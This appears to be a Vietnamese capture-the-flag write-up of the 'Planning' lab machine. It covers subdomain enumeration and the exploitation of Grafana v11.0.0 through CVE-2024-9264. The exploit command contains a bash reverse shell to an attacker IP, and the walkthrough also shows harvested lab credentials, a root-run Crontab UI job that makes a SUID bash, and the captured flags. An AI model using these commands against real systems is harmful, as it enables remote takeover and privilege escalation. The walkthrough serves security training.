
![[Pasted image 20261124185240.png]]


# Attack Vector

- root(docker): Nmap -> web enumeration -> grafana v11.0.0 -> CVE-2024-9264 -> RCE -> root(docker)
- enzo: environment enumeration -> credentials -> SSH user enzo -> shell
- root: System enumeration -> cổng 8000 đang chạy internal service Crontab UI ngoài ra cũng tìm ra được credentials root của service này -> tạo lịch chứa mã độc -> root shell.
# Nmap

```txt
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)  
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)  
80/tcp open  http    nginx 1.24.0 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Nhận xét về host:
	- cổng 22 đang mở SSH service
	- cổng 80 đang mở web nginx service 
	- các thông tin bên lề cho thấy đây là 1 máy ubuntu


# web enumeration

- khi chúng ta vào trang web trên chúng ta chả thấy gì thú vị cả và cũng như đi tìm thêm directory khác thì cũng không đáng giá mấy


- Bắt đầu đi tìm subdomain/ v-host

```bash
┌─[gerryhtb@parrot]─[~/Desktop/lab/planning]  
└──_ $ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.planning.htb' -u http://planning.htb -c -fs 178  
  
       /'___\  /'___\           /'___\  
      /\ \__/ /\ \__/  __  __  /\ \__/  
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\  
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/  
        \ \_\   \ \_\  \ \____/  \ \_\  
         \/_/    \/_/   \/___/    \/_/  
  
      2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://planning.htb  
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  
:: Header           : Host: FUZZ.planning.htb  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
:: Filter           : Response size: 178  
________________________________________________  
  
grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 46ms]
```
=> Chúng ta thấy được 1 subdomain khá hay là grafana.planning.htb

- Khi chúng ta vào trang web đó chúng ta thấy được rằng trang web đang được chạy grafana phiên bản v11.0.0


# shell as root (docker)

- dựa trên việc grafana đang là phiên bản v11.0.0 là 1 phiên bản đặc biệt bị lỗ hổng SQL-injection cho duck database giúp chúng ta thực hiện command injection vào hệ thống, chúng ta có thể tiêm lệnh reverse shell vào và chiếm được shell của nạn nhân
- sử dụng credentials đề bài cho sẵn ta thực hiện tiêm lệnh bằng script python sau
sử dụng lỗ hổng này https://github.com/nollium/CVE-2024-9264



```bash
(venv) ┌─[_]─[gerryhtb@parrot]─[~/Desktop/lab/planning/CVE-2024-9264]  
└──_ $python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'bash -c "bash -i >& /dev/tcp/10.10.14.154/1234 0>&1"' http://grafana.planning.htb  
[+] Logged in as admin:0D5oT70Fq13EvB5r  
[+] Executing command: bash -c "bash -i >& /dev/tcp/10.10.14.154/1234 0>&1"  
[x] Execution interrupted (Ctrl-C)  
(venv) ┌─[gerryhtb@parrot]─[~/Desktop/lab/planning/CVE-2024-9264]  
└──_ $
```

thế là ta đã có shell và env của hệ thống

```bash
public  
root@7ce659d667d7:~# env  
env  
AWS_AUTH_SESSION_DURATION=15m  
HOSTNAME=7ce659d667d7  
PWD=/usr/share/grafana  
AWS_AUTH_AssumeRoleEnabled=true  
GF_PATHS_HOME=/usr/share/grafana  
AWS_CW_LIST_METRICS_PAGE_LIMIT=500  
HOME=/usr/share/grafana  
AWS_AUTH_EXTERNAL_ID=  
SHLVL=2  
GF_PATHS_PROVISIONING=/etc/grafana/provisioning  
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!  
GF_SECURITY_ADMIN_USER=enzo  
GF_PATHS_DATA=/var/lib/grafana  
GF_PATHS_LOGS=/var/log/grafana  
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
AWS_AUTH_AllowedAuthProviders=default,keys,credentials  
GF_PATHS_PLUGINS=/var/lib/grafana/plugins  
GF_PATHS_CONFIG=/etc/grafana/grafana.ini  
_=/usr/bin/env  
root@7ce659d667d7:~#
```



# shell as enzo

dựa vào env của hệ thống ta thấy 1 user tên là enzo và password RioTecRANDEntANT!

```bash
┌─[gerryhtb@parrot]─[~/Desktop/lab]  
└──_ $ssh enzo@planning.htb  
enzo@planning.htb's password:  
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/pro  
  
System information as of Tue Nov 24 11:37:25 AM UTC 2026  
  
 System load:  0.0               Processes:             227  
 Usage of /:   66.2% of 6.30GB   Users logged in:       0  
 Memory usage: 42%               IPv4 address for eth0: 10.129.237.241  
 Swap usage:   0%  
  
  
Expanded Security Maintenance for Applications is not enabled.  
  
102 updates can be applied immediately.  
77 of these updates are standard security updates.  
To see these additional updates run: apt list --upgradable  
  
1 additional security update can be applied with ESM Apps.  
Learn more about enabling ESM Apps service at https://ubuntu.com/esm  
  
  
The list of available updates is more than a week old.  
To check for new updates run: sudo apt update  
Last login: Tue Nov 24 11:37:26 2026 from 10.10.14.154  
enzo@planning:~$ cat user.txt  
55f69c00328d370dfe4c77dfca5706fc  
enzo@planning:~$
```

chúng ta vào được enzo


# shell as root

- Sau 1 chút thời gian tìm hiểu chúng ta vào được /opt/crontabs và nó chứa crontab.db

```bash
enzo@planning:/opt/crontabs$ cat *.db | jq  
{  
 "name": "Grafana backup",  
 "command": "/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.  
gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz",  
 "schedule": "@daily",  
 "stopped": false,  
 "timestamp": "Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)",  
 "logging": "false",  
 "mailing": {},  
 "created": 1740774983276,  
 "saved": false,  
 "_id": "GTI22PpoJNtRKg0W"  
}  
{  
 "name": "Cleanup",  
 "command": "/root/scripts/cleanup.sh",  
 "schedule": "* * * * *",  
 "stopped": false,  
 "timestamp": "Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)",  
 "logging": "false",  
 "mailing": {},  
 "created": 1740849309992,  
 "saved": false,  
 "_id": "gNIRXh1WIc9K7BYX"  
}  
enzo@planning:/opt/crontabs$
```

dựa vào lệnh backup tôi có thể thấy password là P4ssw0rdS0pRi0T3c

ngoài ra tôi cũng phát hiện cổng 8000 đang mở dịch vụ của root
```bash
Netid            State             Recv-Q            Send-Q                       Local Address:Port                        Peer Address:Port           Process  
udp              UNCONN            0                 0                               127.0.0.54:53                               0.0.0.0:*  
udp              UNCONN            0                 0                            127.0.0.53%lo:53                               0.0.0.0:*  
udp              UNCONN            0                 0                                  0.0.0.0:68                               0.0.0.0:*  
tcp              LISTEN            0                 4096                            127.0.0.54:53                               0.0.0.0:*  
tcp              LISTEN            0                 70                               127.0.0.1:33060                            0.0.0.0:*  
tcp              LISTEN            0                 511                                0.0.0.0:80                               0.0.0.0:*  
tcp              LISTEN            0                 151                              127.0.0.1:3306                             0.0.0.0:*  
tcp              LISTEN            0                 4096                             127.0.0.1:3000                             0.0.0.0:*  
tcp              LISTEN            0                 511                              127.0.0.1:8000                             0.0.0.0:*  
tcp              LISTEN            0                 4096                         127.0.0.53%lo:53                               0.0.0.0:*  
tcp              LISTEN            0                 4096                             127.0.0.1:36613                            0.0.0.0:*  
tcp              LISTEN            0                 4096                                     *:22                                     *:*
```


thực hiện port forwarding ta có thể thấy rằng cổng 8000 này thực chất đang chạy crontab UI service cho phép ta tạo lệnh và lên lịch thực thi lệnh với quyền root

=> PRIVILEGE ESCALATION bằng cách tạo 1 tiến trình mã độc 'cp /bin/bash /tmp/pwn; chmod u+s /tmp/pwn' và bấm vào nút chạy luôn ta có SUID lên root



```bash
enzo@planning:/tmp$ ls -la  
total 1468  
drwxrwxrwt 13 root root    4096 Nov 24 11:48 .  
drwxr-xr-x 22 root root    4096 Apr  3  2025 ..  
drwxrwxrwt  2 root root    4096 Nov 24 10:40 .ICE-unix  
drwxrwxrwt  2 root root    4096 Nov 24 10:40 .X11-unix  
drwxrwxrwt  2 root root    4096 Nov 24 10:40 .XIM-unix  
drwxrwxrwt  2 root root    4096 Nov 24 10:40 .font-unix  
-rw-r--r--  1 root root       0 Nov 24 11:48 YvZsUUfEXayH6lLj.stderr  
-rw-r--r--  1 root root       0 Nov 24 11:48 YvZsUUfEXayH6lLj.stdout  
-rw-r--r--  1 root root       0 Nov 24 11:47 gNIRXh1WIc9K7BYX.stderr  
-rw-r--r--  1 root root       0 Nov 24 11:47 gNIRXh1WIc9K7BYX.stdout  
-rw-r--r--  1 root root       0 Nov 24 11:48 iOKPPByH9dE726KD.stderr  
-rw-r--r--  1 root root       0 Nov 24 11:48 iOKPPByH9dE726KD.stdout  
-rwsr-xr-x  1 root root 1446024 Nov 24 11:48 pwn  
drwx------  3 root root    4096 Nov 24 10:40 systemd-private-c18571cd7f3643c1b07566cd09e7dfeb-ModemManager.service-LE6bpt  
drwx------  3 root root    4096 Nov 24 10:40 systemd-private-c18571cd7f3643c1b07566cd09e7dfeb-polkit.service-SOv7MK  
drwx------  3 root root    4096 Nov 24 10:40 systemd-private-c18571cd7f3643c1b07566cd09e7dfeb-systemd-logind.service-PjMNlD  
drwx------  3 root root    4096 Nov 24 10:40 systemd-private-c18571cd7f3643c1b07566cd09e7dfeb-systemd-resolved.service-nCyVSp  
drwx------  3 root root    4096 Nov 24 10:40 systemd-private-c18571cd7f3643c1b07566cd09e7dfeb-systemd-timesyncd.service-jBFTGV  
drwx------  3 root root    4096 Nov 24 10:49 systemd-private-c18571cd7f3643c1b07566cd09e7dfeb-upower.service-mlqUCe  
drwx------  2 root root    4096 Nov 24 10:41 vmware-root_725-4282367508  
enzo@planning:/tmp$ ./pwn -p  
pwn-5.2# cat /root.txt  
cat: /root.txt: No such file or directory  
pwn-5.2# cat /root/root.txt  
b240834fa9578ff89649384f399d25de  
pwn-5.2#
```

